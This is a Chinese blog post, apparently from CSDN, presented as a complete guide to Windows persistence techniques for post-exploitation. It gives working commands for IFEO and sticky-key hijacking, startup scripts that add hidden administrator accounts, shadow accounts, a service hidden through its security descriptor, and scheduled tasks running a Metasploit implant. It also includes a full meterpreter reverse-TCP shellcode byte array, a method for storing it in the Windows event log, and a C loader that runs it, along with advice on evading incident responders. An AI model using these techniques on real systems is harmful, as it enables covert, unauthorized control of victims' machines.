# 原创
：  2023史上最全Windows常见的几种权限维持

# 2023史上最全Windows常见的几种权限维持

**目录**

[1.映像劫持技术](#1.%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[2.策略组脚本维持](#2.%E7%AD%96%E7%95%A5%E7%BB%84%E8%84%9A%E6%9C%AC%E7%BB%B4%E6%8C%81)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[3.辅助功能之粘滞键](#3.%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E4%B9%8B%E7%B2%98%E6%BB%9E%E9%94%AE)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[4.注册表自启动](#4.%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[5.powershell配置文件后门](#5.powershell%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[6.建立影子账号](#6.%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E8%B4%A6%E5%8F%B7)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[7.利用安全描述符隐藏服务后门进行权限维持](#7.%E5%88%A9%E7%94%A8%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81)

[简介](#%E7%AE%80%E4%BB%8B)

[复现](#%E5%A4%8D%E7%8E%B0)

[8.计划任务后门](#8.%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8)

[1、前言](#1%E3%80%81%E5%89%8D%E8%A8%80)

[2、实操](#2%E3%80%81%E5%AE%9E%E6%93%8D)

[9. Windows事件日志“隐藏”Shellcode](#9.%20Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E2%80%9C%E9%9A%90%E8%97%8F%E2%80%9DShellcode)

[0x01 基本概述](#0x01%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0)

[0x02 事件日志写入](#0x02%20%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5)

[0x03 ShellCode加载](#0x03%20ShellCode%E5%8A%A0%E8%BD%BD)

[0x04 注意事项](#0x04%20%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9)

---


#### 1.映像劫持技术

###### 简介

“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。简单点说，当你打开的是程序A，而运行的却是程序B。

###### 复现

执行命令，将cmd.exe程序劫持粘滞键。

`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"`

连续按5次shift键之后，目标系统弹出cmd.exe，并不是之前的粘滞键界面

#### 2.策略组脚本维持

###### 简介

Windows操作系统的组策略是配置计算机中某一些用户组策略的程序，由系统管理员操作控制计算机程序、访问网络资源、操作行为、各种软件设置的最主要工具。

###### 复现

第一步：准备一个bat脚本，内容为：net user qiesi abc123.. /add &amp; net localgroup administrators qiesi /add ； 并将脚本放到C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup中

第二步：【gpedit.msc】打开组策略，在 【windows 设置】-&gt; 【脚本(启动/关机】-&gt; 启动 -&gt; 添加1.bat。 这样的话，每一次启动都会创建一个qiesi账户。

第三步：重启服务器

#### 3.辅助功能之粘滞键

###### 简介

辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读），可以帮助人更轻松地使用Windows操作系统，但是此功能可能会被滥用，以在已启用RDP且已获得管理员级别权限的主机上实现持久性。

###### 复现

第一步：将sethc.exe拥有者改为administrator。

第二步：输入命令

`move C:\windows\system32\sethc.exe C:\windows\system32\sethc1.exe`<br/>`Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe`

第三步：连续按5次shift

最后，除了shift之外，还有以下这些也可以尝试

#### 4.注册表自启动

###### 简介

注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。

###### 复现

第一步：输入命令

`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "test2" /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f`

第二步：重启服务器，自动会打开notepad.exe

#### 5.powershell配置文件后门

###### 简介

Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。Powershell配置文件其实就是一个powershell脚本，他可以在每次运行powershell的时候自动运行，所以可以通过向该文件写入自定义的语句用来长期维持权限。

###### 复现

第一步：准备1.bat脚本，内容为：net user qiesi abc123.. /add &amp; net localgroup administrators qiesi /add

第二步：打开Windows PowerShell ，输入以下命令

```
echo $profile # 查看当前是否存在配置文件。

Test-path $profile # 如果返回Flase 则可以进行配置

New-Item -Path $profile -Type File –Force # 创建配置文件

$string = 'Start-Process "C:\1.bat"'

$string | Out-File -FilePath $profile -Append

more $profile # 查看文件
```

第三步：重新打开powershell就会自动执行

#### 6.建立影子账号

###### 简介

影子账户，顾名思义就是隐藏的账户，在“控制面板-用户账户”里面是看不见，但却有管理员权限的账户

###### 复现

第一步：创建一个带$符号的账户。

第二步：打开注册表HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User。将管理员对应的F项的值，复制粘贴到qiesi$用户的对应F项的值。

第三步：导出用户及对应的项的注册表文件，删除掉用户。

第四步：重新导入，双击reg文件即可。

第五步：登陆目标服务器，利用影子账号。

首先，管理账户中并没有qiesi$账户

远程登陆

#### 7.利用安全描述符隐藏服务后门进行权限维持

###### 简介

windows访问控制模型分为两部分：1.access token(访问令牌)。2.安全描述符。安全描述符包含与安全对象关联的安全信息。安全描述符包含安全描述符结构及其关联的安全信息。可以利用sc来进行创建。

###### 复现

第一步：cmd创建自启动服务

`sc create ".NET CLR Networking 3.5.0.0" binpath= "cmd.exe /k C:\Windows\System32\notepad.exe" depend= Tcpip obj= Localsystem start= auto`

第二步：隐藏服务

```
sc sdset ".NET CLR Networking 3.5.0.0" "D:(D;;DCLCWPDTSD;;;IU)

(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)

(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)

(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

#### 8.计划任务后门

原文地址：【内网渗透】后渗透之计划任务后门

###### 1、前言

我们做权限维持的时候，万一出了啥情况，shell就掉了，这时候可以去写一个计划任务，帮助我们获得权限

###### 2、实操

首先你需要知道计划任务怎么用

```
schtasks /Create /tn Updater /tr notepad.exe /sc MINUTE /mo 1



/tn 任务名字

/tr 启动运行的脚本

/sc 多久运行一次

/Create 创建新计划任务

/Delete 删除计划任务

/Query 显示计划热为奴

/Change 更改计划任务属性

/Run 按需运行计划任务

/End 中止当前正在运行的计划任务

/ShowSid 显示与计划的任务名称相应的安全标识符

/? 显示帮助信息
```

然后你需要用msf生成一个马子，再创建一个计划任务<br/>`schtasks /create /tn muma /sc minute /mo 1 /tr C:\muma.exe /ru system /f`

新建一个计划任务，每分钟启动一次

开启我们的msf监听

反弹成功

#### 9. Windows事件日志“隐藏”Shellcode

原文地址：Windows事件日志“隐藏”Shellcode

###### 0x01 基本概述

Windows默认事件日志查看器为eventvwr.msc，能实现简单的使用，Win+R键后输入eventvwr回车即能打开。Windows主要的日志在“Windows 日志”中，该文件夹中包含所有Windows系统上的五个标准类别。比较常用的Windows日志有系统日志、安全日志、应用程序日志这三个日志内容。

事件查看器的另一个“应用程序和服务日志”文件夹里，包含Windows系统中其它各类重要服务组件的事件日志。Windows PowerShell日志在该集合中。

Windows事件日志文件实际上是以特定的数据结构的方式存储内容，每条记录事件的数据结构由9个字段组成，包括日志名称、来源、记录时间、事件ID、任务类别、级别、计算机、事件数据（EventData）等信息。其中事件数据仅支持消息和二进制数据。

###### 0x02 事件日志写入

我们可以使用PowerShell操作Windows事件日志，其中Write-EventLog命令可以将事件写入事件日志，参考微软官方文档（https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/write-eventlog?view=powershell-5.1） ，其中参数对应上面介绍的字段：

```

Write-EventLog

[-LogName]

[-Source]

[[-EntryType] ]

[-Category ]

[-EventId]

[-Message]

[-RawData ]

[-ComputerName ]

[]
```

示例 1：将事件写入应用程序事件日志

```
Write-EventLog -LogName "Application" -Source "MyApp" -EventID 3001 -EntryType Information -Message "MyApp added a user-requested feature to the display." -Category 1 -RawData 10,20
```

此命令将事件从 MyApp 源写入应用程序事件日志。

示例 2：将事件写入远程计算机的应用程序事件日志

```

Write-EventLog -ComputerName "Server01" -LogName Application -Source "MyApp" -EventID 3001 -Message "MyApp added a user-requested feature to the display."
```

此命令将事件从 MyApp 源写入 Server01 远程计算机上的应用程序事件日志。

实际应用：

1、执行命令

```
Write-EventLog -LogName Application -Source edge -EventID 65535 -EntryType Information -Category 0 -Message "Hello World!"
```

在事件查看器中，可以看到事件ID为65535的日志成功创建在应用程序日志中，消息为Hello World!

###### 0x03 ShellCode加载

只需在Write-EventLog中使用-RawData参数，就可以在事件日志字段中包含二进制数据，而且必须将二进制数据作为字节数组传到-RawData参数中。我们可以将其包含数据的十六进制字符串转换为字节数组，然后再传递。

1、首先，使用msfvenom生成弹计算器 payload。输出格式为十六进制字符串

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f hex
```

利用工具网站（http://gv99.com/text/hex2bytes.html） 转为字节数组

```
$data = [Byte[]](0xFC, 0xE8, 0x8F, 0x00, 0x00, 0x00, 0x60, 0x31, 0xD2, 0x89, 0xE5, 0x64, 0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x31, 0xFF, 0x8B, 0x72, 0x28, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x49, 0x75, 0xEF, 0x52, 0x8B, 0x52, 0x10, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x57, 0x8B, 0x40, 0x78, 0x85, 0xC0, 0x74, 0x4C, 0x01, 0xD0, 0x50, 0x8B, 0x58, 0x20, 0x01, 0xD3, 0x8B, 0x48, 0x18, 0x85, 0xC9, 0x74, 0x3C, 0x49, 0x31, 0xFF, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xC0, 0xC1, 0xCF, 0x0D, 0xAC, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75, 0xE0, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0, 0x58, 0x5F, 0x5A, 0x8B, 0x12, 0xE9, 0x80, 0xFF, 0xFF, 0xFF, 0x5D, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F, 0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0x89, 0xE8, 0xFF, 0xD0, 0xB8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xC4, 0x54, 0x50, 0x68, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x6A, 0x0A, 0x68, 0x0A, 0xD3, 0x37, 0x04, 0x68, 0x02, 0x00, 0x1F, 0x57, 0x89, 0xE6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x97, 0x6A, 0x10, 0x56, 0x57, 0x68, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x0A, 0xFF, 0x4E, 0x08, 0x75, 0xEC, 0xE8, 0x67, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x04, 0x56, 0x57, 0x68, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5, 0x83, 0xF8, 0x00, 0x7E, 0x36, 0x8B, 0x36, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6A, 0x00, 0x68, 0x58, 0xA4, 0x53, 0xE5, 0xFF, 0xD5, 0x93, 0x53, 0x6A, 0x00, 0x56, 0x53, 0x57, 0x68, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5, 0x83, 0xF8, 0x00, 0x7D, 0x28, 0x58, 0x68, 0x00, 0x40, 0x00, 0x00, 0x6A, 0x00, 0x50, 0x68, 0x0B, 0x2F, 0x0F, 0x30, 0xFF, 0xD5, 0x57, 0x68, 0x75, 0x6E, 0x4D, 0x61, 0xFF, 0xD5, 0x5E, 0x5E, 0xFF, 0x0C, 0x24, 0x0F, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0xE9, 0x9B, 0xFF, 0xFF, 0xFF, 0x01, 0xC3, 0x29, 0xC6, 0x75, 0xC1, 0xC3, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x6A, 0x00, 0x53, 0xFF, 0xD5)
```

使用密钥管理服务日志和KmsRequests作为源进行事件日志写入

```
Write-EventLog -LogName 'Key Management Service' -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message "Hello World!" -RawData $data
```

执行shellcode

```
#include &lt;windows.h&gt;

#include &lt;stdio.h&gt;

#include &lt;string.h&gt;

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#define BUFFER_SIZE 1024

int main()

{

HANDLE hEventLog;

LPCTSTR lpUNCServerName = NULL;

LPCTSTR lpSourceName = TEXT("Key Management Service");

DWORD dwReadFlags = EVENTLOG_BACKWARDS_READ | EVENTLOG_SEQUENTIAL_READ;

DWORD dwRecordOffset = 0; //

DWORD dwBytesRead = 0;

DWORD dwMinimumBytesToRead = 0;

DWORD dwTimeGenerated = 0;

BYTE bBuffer[BUFFER_SIZE];

EVENTLOGRECORD* pevlr = (EVENTLOGRECORD*)&amp;bBuffer;

// Open EventLog, Get Handler

hEventLog = OpenEventLog(lpUNCServerName, lpSourceName);

if (hEventLog == NULL)

{

printf("OpenEventLog failed (%d)\n", GetLastError());

return 0;

}

// Read EventLog

if (!ReadEventLog(hEventLog, dwReadFlags, dwRecordOffset, pevlr, BUFFER_SIZE, &amp;dwBytesRead, &amp;dwMinimumBytesToRead))

{

printf("ReadEventLog failed %d\n", GetLastError());

return 0;

}

// Get TimeGenerated

//dwTimeGenerated = ((EVENTLOGRECORD*)pevlr)-&gt;TimeGenerated;

//Get Binary Data

BYTE* pEventData = (BYTE*)pevlr + pevlr-&gt;DataOffset;

//Loader

HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

void* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, BUFFER_SIZE);

memcpy(exec, pEventData, BUFFER_SIZE);

((void(*)())exec)();

return 0;

}
```

###### 0x04 注意事项

用户限制<br/> 事件日志的写入权限问题。为了能在事件日志条目中存储有效负载，我们拿到的权限必须要能写入日志。<br/> 大小限制<br/> 需要注意的另一个限制是，事件日志中可以存储的数据量有大小限制。基于事件消息字符串的最大字符限制为31,839个字符。<br/> 持久性<br/> 在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\对应的日志名称下的条目中，存在一个EventMessageFile属性。如果在注入载荷的时候，事件ID不存在于该属性指定的源关联的事件消息文件中，则会出现下图这个日志消息：

为了能够更加的持久化不被发现，事件ID和级别等字段都应该伪装成日常日志的样子，以免被应急人员察觉到异常。

> 
声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！


@**学习更多渗透技能！体验靶场实战练习**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/ff567872c2ee43b0a4d2b5bd5a6bb34d.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/36492cf51c064b068ba61f038ba19d8b.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/6a88682cd5314a58ab5bf653aeba8a1c.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/80889e355d184ac29984995f750f7816.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/f73f2708d06f4967b196a58b7e055b74.png" width="665"/>

应急响应笔记

学习路线
